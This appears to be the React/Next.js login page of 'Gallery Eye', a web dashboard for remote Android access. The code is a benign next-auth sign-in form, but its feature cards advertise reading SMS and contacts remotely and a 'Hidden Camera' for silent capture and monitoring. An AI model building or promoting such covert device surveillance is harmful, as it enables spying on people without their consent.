'use client';

import { signIn } from 'next-auth/react';
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import VideoModal from '@/components/VideoModal';
import Image from 'next/image';

export default function LoginPage() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState('');
    const [mounted, setMounted] = useState(false);
    const router = useRouter();

    useEffect(() => { setMounted(true); }, []);

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setError('');
        setIsLoading(true);
        const result = await signIn('credentials', {
            email,
            password,
            redirect: false,
        });
        setIsLoading(false);
        if (result?.ok) {
            router.push('/');
        } else {
            setError('Incorrect email or password. Please try again.');
        }
    };

    const features = [
        { icon: <GalleryIcon />, label: 'Gallery Sync', desc: 'Access your photos & videos remotely', color: '#10b981' },
        { icon: <MessageIcon />, label: 'SMS & Contacts', desc: 'Read messages from anywhere', color: '#06b6d4' },
        { icon: <CameraIcon />, label: 'Hidden Camera', desc: 'Silent capture & monitoring', color: '#8b5cf6' },
        { icon: <ShieldIcon />, label: 'End-to-End Secure', desc: 'Military-grade encryption', color: '#10b981' },
    ];

    return (
        <main className="min-h-[100dvh] flex relative overflow-hidden" style={{ background: '#0a0b0d' }}>

            {/* Background mesh gradient */}
            <div className="absolute inset-0 pointer-events-none">
                <div style={{
                    position: 'absolute', top: '-20%', left: '-10%',
                    width: '60%', height: '60%', borderRadius: '50%',
                    background: 'radial-gradient(circle, rgba(16,185,129,0.08) 0%, transparent 70%)',
                    filter: 'blur(80px)',
                }} />
                <div style={{
                    position: 'absolute', bottom: '-20%', right: '-10%',
                    width: '50%', height: '50%', borderRadius: '50%',
                    background: 'radial-gradient(circle, rgba(99,102,241,0.06) 0%, transparent 70%)',
                    filter: 'blur(80px)',
                }} />
                <div style={{
                    position: 'absolute', top: '40%', left: '50%', transform: 'translate(-50%, -50%)',
                    width: '40%', height: '40%', borderRadius: '50%',
                    background: 'radial-gradient(circle, rgba(6,182,212,0.04) 0%, transparent 70%)',
                    filter: 'blur(60px)',
                }} />
            </div>

            {/* Subtle grid pattern */}
            <div className="absolute inset-0 pointer-events-none" style={{
                backgroundImage: `linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px)`,
                backgroundSize: '64px 64px',
            }} />

            {/* Left panel - brand showcase (desktop) */}
            <aside className={`hidden lg:flex lg:w-[52%] relative flex-col items-center justify-center p-16 ${mounted ? 'animate-fade-in' : 'opacity-0'}`}>
                <div className="relative z-10 max-w-lg w-full">

                    {/* Logo + brand */}
                    <div className="flex items-center gap-4 mb-14">
                        <div style={{
                            width: 52, height: 52, borderRadius: '1rem',
                            background: 'linear-gradient(135deg, rgba(16,185,129,0.15), rgba(6,182,212,0.1))',
                            border: '1px solid rgba(16,185,129,0.25)',
                            display: 'flex', alignItems: 'center', justifyContent: 'center',
                            boxShadow: '0 0 20px rgba(16,185,129,0.1)',
                            overflow: 'hidden',
                        }}>
                            <Image
                                src="/gallery-eye-logo.jpg"
                                alt="Gallery Eye"
                                width={52}
                                height={52}
                                style={{ objectFit: 'cover', borderRadius: '1rem' }}
                            />
                        </div>
                        <div>
                            <span style={{
                                fontFamily: "'Plus Jakarta Sans', sans-serif",
                                fontWeight: 800, fontSize: '1.25rem',
                                color: '#f1f5f9', letterSpacing: '-0.03em',
                                display: 'block',
                            }}>
                                Gallery Eye
                            </span>
                            <span style={{ fontSize: '0.7rem', color: 'rgba(148,163,184,0.8)', fontWeight: 500, letterSpacing: '0.05em', textTransform: 'uppercase' }}>
                                Remote Device Manager
                            </span>
                        </div>
                    </div>

                    {/* Headline */}
                    <div style={{ marginBottom: '3rem' }}>
                        <div style={{
                            display: 'inline-flex', alignItems: 'center', gap: '0.5rem',
                            background: 'rgba(16,185,129,0.08)', border: '1px solid rgba(16,185,129,0.2)',
                            borderRadius: 9999, padding: '0.3rem 0.85rem',
                            fontSize: '0.65rem', fontWeight: 600, letterSpacing: '0.1em',
                            textTransform: 'uppercase', color: '#34d399', marginBottom: '1.5rem',
                        }}>
                            <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#34d399', display: 'inline-block', animation: 'pulse-soft 2s infinite' }} />
                            Secure Remote Access
                        </div>
                        <h1 style={{
                            fontFamily: "'Plus Jakarta Sans', sans-serif",
                            fontWeight: 800, fontSize: 'clamp(2.25rem, 3.5vw, 3rem)',
                            lineHeight: 1.1, letterSpacing: '-0.04em',
                            color: '#f8fafc',
                            marginBottom: '1.25rem',
                        }}>
                            Your device,{' '}
                            <span style={{
                                background: 'linear-gradient(135deg, #34d399 0%, #06b6d4 50%, #818cf8 100%)',
                                WebkitBackgroundClip: 'text',
                                WebkitTextFillColor: 'transparent',
                                backgroundClip: 'text',
                            }}>anywhere</span>
                            <br />you are.
                        </h1>
                        <p style={{
                            color: '#94a3b8', fontSize: '1.05rem',
                            lineHeight: 1.7, maxWidth: '38ch',
                        }}>
                            Connect to your Android from any browser. Sync media, monitor activity, and stay in control.
                        </p>
                    </div>

                    {/* Feature cards */}
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
                        {features.map((f, i) => (
                            <div key={i} className={`${mounted ? 'animate-slide-up' : 'opacity-0'}`} style={{
                                display: 'flex', alignItems: 'flex-start', gap: '0.75rem',
                                padding: '1rem 1rem',
                                background: 'rgba(255,255,255,0.02)',
                                border: '1px solid rgba(255,255,255,0.06)',
                                borderRadius: '1rem',
                                animationDelay: `${i * 100 + 300}ms`,
                                animationFillMode: 'both',
                                transition: 'all 0.3s ease',
                            }}>
                                <div style={{
                                    width: 36, height: 36, borderRadius: '0.625rem', flexShrink: 0,
                                    background: `${f.color}12`,
                                    border: `1px solid ${f.color}25`,
                                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                                    color: f.color,
                                }}>
                                    {f.icon}
                                </div>
                                <div>
                                    <span style={{ color: '#e2e8f0', fontSize: '0.8125rem', fontWeight: 600, display: 'block', marginBottom: '0.15rem' }}>
                                        {f.label}
                                    </span>
                                    <span style={{ color: '#64748b', fontSize: '0.7rem', lineHeight: 1.4 }}>
                                        {f.desc}
                                    </span>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            </aside>

            {/* Right panel - login form */}
            <section className="flex-1 flex flex-col items-center justify-center p-6 sm:p-10 relative">
                <div className={`w-full max-w-[400px] ${mounted ? 'animate-slide-up' : 'opacity-0'}`} style={{ animationDelay: '100ms', animationFillMode: 'both' }}>

                    {/* Mobile logo */}
                    <div className="flex lg:hidden items-center justify-center gap-3 mb-10">
                        <div style={{
                            width: 44, height: 44, borderRadius: '0.875rem',
                            overflow: 'hidden',
                            border: '1px solid rgba(16,185,129,0.25)',
                            boxShadow: '0 0 20px rgba(16,185,129,0.1)',
                        }}>
                            <Image
                                src="/gallery-eye-logo.jpg"
                                alt="Gallery Eye"
                                width={44}
                                height={44}
                                style={{ objectFit: 'cover' }}
                            />
                        </div>
                        <span style={{ fontWeight: 800, fontSize: '1.125rem', letterSpacing: '-0.02em', color: '#f1f5f9' }}>
                            Gallery Eye
                        </span>
                    </div>

                    {/* Card */}
                    <div style={{
                        background: 'rgba(255,255,255,0.025)',
                        border: '1px solid rgba(255,255,255,0.08)',
                        borderRadius: '1.75rem',
                        padding: '2.25rem',
                        backdropFilter: 'blur(20px)',
                        boxShadow: '0 25px 60px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.05)',
                    }}>
                        <div style={{ marginBottom: '2rem', textAlign: 'center' }}>
                            <h2 style={{
                                fontWeight: 800, fontSize: '1.625rem',
                                letterSpacing: '-0.03em', marginBottom: '0.5rem',
                                color: '#f8fafc',
                            }}>
                                Welcome back
                            </h2>
                            <p style={{ color: '#64748b', fontSize: '0.875rem' }}>
                                Sign in to access your dashboard
                            </p>
                        </div>

                        {/* Google sign-in */}
                        <button
                            onClick={() => signIn('google', { callbackUrl: '/' })}
                            style={{
                                width: '100%',
                                display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.75rem',
                                background: '#ffffff', color: '#1e293b',
                                fontFamily: "'Plus Jakarta Sans', sans-serif", fontWeight: 600, fontSize: '0.9375rem',
                                padding: '0.8125rem 1.25rem', borderRadius: '0.875rem', border: 'none',
                                cursor: 'pointer', marginBottom: '1.5rem',
                                transition: 'all 0.2s cubic-bezier(0.32,0.72,0,1)',
                                boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
                            }}
                            onMouseEnter={e => {
                                (e.currentTarget as HTMLButtonElement).style.transform = 'translateY(-2px)';
                                (e.currentTarget as HTMLButtonElement).style.boxShadow = '0 12px 32px rgba(0,0,0,0.25)';
                            }}
                            onMouseLeave={e => {
                                (e.currentTarget as HTMLButtonElement).style.transform = 'translateY(0)';
                                (e.currentTarget as HTMLButtonElement).style.boxShadow = '0 2px 8px rgba(0,0,0,0.1)';
                            }}
                        >
                            <GoogleIcon />
                            Continue with Google
                        </button>

                        {/* Divider */}
                        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', marginBottom: '1.5rem' }}>
                            <div style={{ flex: 1, height: 1, background: 'rgba(255,255,255,0.08)' }} />
                            <span style={{ color: '#475569', fontSize: '0.75rem', fontWeight: 500 }}>or</span>
                            <div style={{ flex: 1, height: 1, background: 'rgba(255,255,255,0.08)' }} />
                        </div>

                        {/* Form */}
                        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                            <div>
                                <label style={{
                                    display: 'block', fontSize: '0.8125rem', fontWeight: 500,
                                    color: '#94a3b8', marginBottom: '0.5rem',
                                }}>
                                    Email address
                                </label>
                                <input
                                    type="email"
                                    value={email}
                                    onChange={(e) => { setEmail(e.target.value); setError(''); }}
                                    placeholder="name@example.com"
                                    required
                                    autoComplete="email"
                                    style={{
                                        width: '100%', padding: '0.75rem 1rem',
                                        background: 'rgba(255,255,255,0.04)',
                                        border: '1px solid rgba(255,255,255,0.1)',
                                        borderRadius: '0.75rem', color: '#f1f5f9',
                                        fontSize: '0.9375rem', outline: 'none',
                                        transition: 'border-color 0.2s, box-shadow 0.2s',
                                    }}
                                    onFocus={e => {
                                        e.currentTarget.style.borderColor = 'rgba(16,185,129,0.5)';
                                        e.currentTarget.style.boxShadow = '0 0 0 3px rgba(16,185,129,0.1)';
                                    }}
                                    onBlur={e => {
                                        e.currentTarget.style.borderColor = 'rgba(255,255,255,0.1)';
                                        e.currentTarget.style.boxShadow = 'none';
                                    }}
                                />
                            </div>
                            <div>
                                <label style={{
                                    display: 'block', fontSize: '0.8125rem', fontWeight: 500,
                                    color: '#94a3b8', marginBottom: '0.5rem',
                                }}>
                                    Password
                                </label>
                                <input
                                    type="password"
                                    value={password}
                                    onChange={(e) => { setPassword(e.target.value); setError(''); }}
                                    placeholder="••••••••"
                                    required
                                    autoComplete="current-password"
                                    style={{
                                        width: '100%', padding: '0.75rem 1rem',
                                        background: 'rgba(255,255,255,0.04)',
                                        border: '1px solid rgba(255,255,255,0.1)',
                                        borderRadius: '0.75rem', color: '#f1f5f9',
                                        fontSize: '0.9375rem', outline: 'none',
                                        transition: 'border-color 0.2s, box-shadow 0.2s',
                                    }}
                                    onFocus={e => {
                                        e.currentTarget.style.borderColor = 'rgba(16,185,129,0.5)';
                                        e.currentTarget.style.boxShadow = '0 0 0 3px rgba(16,185,129,0.1)';
                                    }}
                                    onBlur={e => {
                                        e.currentTarget.style.borderColor = 'rgba(255,255,255,0.1)';
                                        e.currentTarget.style.boxShadow = 'none';
                                    }}
                                />
                            </div>

                            {/* Error */}
                            {error && (
                                <div className="animate-slide-up" style={{
                                    display: 'flex', alignItems: 'center', gap: '0.5rem',
                                    padding: '0.75rem 1rem',
                                    background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.2)',
                                    borderRadius: '0.75rem', fontSize: '0.8125rem',
                                    color: '#fca5a5',
                                }}>
                                    <svg style={{ flexShrink: 0 }} width="14" height="14" viewBox="0 0 14 14" fill="none">
                                        <circle cx="7" cy="7" r="6" stroke="#ef4444" strokeWidth="1.5" />
                                        <path d="M7 4v3M7 9.5h.01" stroke="#ef4444" strokeWidth="1.5" strokeLinecap="round" />
                                    </svg>
                                    {error}
                                </div>
                            )}

                            <button
                                type="submit"
                                disabled={isLoading}
                                style={{
                                    width: '100%', marginTop: '0.5rem',
                                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.5rem',
                                    background: isLoading
                                        ? 'rgba(16,185,129,0.5)'
                                        : 'linear-gradient(135deg, #10b981 0%, #059669 100%)',
                                    color: '#fff',
                                    fontFamily: "'Plus Jakarta Sans', sans-serif", fontWeight: 600, fontSize: '0.9375rem',
                                    padding: '0.875rem 1.25rem', borderRadius: '0.875rem', border: 'none',
                                    cursor: isLoading ? 'wait' : 'pointer',
                                    transition: 'all 0.2s cubic-bezier(0.32,0.72,0,1)',
                                    boxShadow: isLoading ? 'none' : '0 4px 20px rgba(16,185,129,0.3), inset 0 1px 0 rgba(255,255,255,0.2)',
                                }}
                                onMouseEnter={e => {
                                    if (!isLoading) {
                                        (e.currentTarget as HTMLButtonElement).style.transform = 'translateY(-1px)';
                                        (e.currentTarget as HTMLButtonElement).style.boxShadow = '0 8px 30px rgba(16,185,129,0.4), inset 0 1px 0 rgba(255,255,255,0.2)';
                                    }
                                }}
                                onMouseLeave={e => {
                                    (e.currentTarget as HTMLButtonElement).style.transform = 'translateY(0)';
                                    if (!isLoading) {
                                        (e.currentTarget as HTMLButtonElement).style.boxShadow = '0 4px 20px rgba(16,185,129,0.3), inset 0 1px 0 rgba(255,255,255,0.2)';
                                    }
                                }}
                            >
                                {isLoading ? (
                                    <>
                                        <svg style={{ animation: 'spin 1s linear infinite' }} width="16" height="16" viewBox="0 0 16 16" fill="none">
                                            <circle cx="8" cy="8" r="6" stroke="rgba(255,255,255,0.3)" strokeWidth="2" />
                                            <path d="M8 2a6 6 0 016 6" stroke="#fff" strokeWidth="2" strokeLinecap="round" />
                                        </svg>
                                        Signing in...
                                    </>
                                ) : 'Sign in'}
                            </button>
                        </form>
                    </div>

                    {/* Video tutorial */}
                    <div style={{ marginTop: '2rem', textAlign: 'center' }}>
                        <p style={{ color: '#475569', fontSize: '0.8125rem', marginBottom: '0.75rem' }}>
                            New here? Watch how it works
                        </p>
                        <VideoModal videoId="0xQaikNVyn0" />
                    </div>
                </div>
            </section>
        </main>
    );
}

/* --- Inline SVG icons --- */
function GoogleIcon() {
    return (
        <svg width="18" height="18" viewBox="0 0 24 24">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
        </svg>
    );
}

function GalleryIcon() {
    return (
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
            <rect x="3" y="3" width="18" height="18" rx="2" />
            <circle cx="8.5" cy="8.5" r="1.5" />
            <path d="M21 15l-5-5L5 21" />
        </svg>
    );
}

function MessageIcon() {
    return (
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
            <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z" />
        </svg>
    );
}

function CameraIcon() {
    return (
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
            <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z" />
            <circle cx="12" cy="13" r="4" />
        </svg>
    );
}

function ShieldIcon() {
    return (
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
            <path d="M9 12l2 2 4-4" />
        </svg>
    );
}
